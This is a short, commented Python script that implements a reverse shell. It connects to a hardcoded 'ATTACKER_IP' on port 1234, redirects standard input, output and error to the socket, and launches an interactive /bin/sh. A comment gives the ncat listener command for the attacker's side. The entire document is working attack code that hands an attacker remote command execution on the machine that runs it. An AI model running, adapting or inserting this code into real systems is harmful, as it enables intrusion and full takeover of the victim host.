# ncat -l -v -p 1234
import socket
import subprocess
import os

ATTACKER_IP = "10.3.0.3"
ATTACKER_PORT = 1234

# AF_INET --> sockets for IPv4
# SOCK_STREAM --> TCP sockets
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ATTACKER_IP, ATTACKER_PORT))
# Send information to the attacker
msg = "[*] Connection Established"
sock.send(msg.encode())
# Duplicate the input file descriptor 0 to the socket
os.dup2(sock.fileno(), 0)
# Duplicate the output file descriptor 1 to the socket
os.dup2(sock.fileno(), 1)
# Duplicate the error file descriptor 2 to the socket
os.dup2(sock.fileno(), 2)
# Execute a shell on the current machine
shell_remote = subprocess.call(["/bin/sh", "-i"])
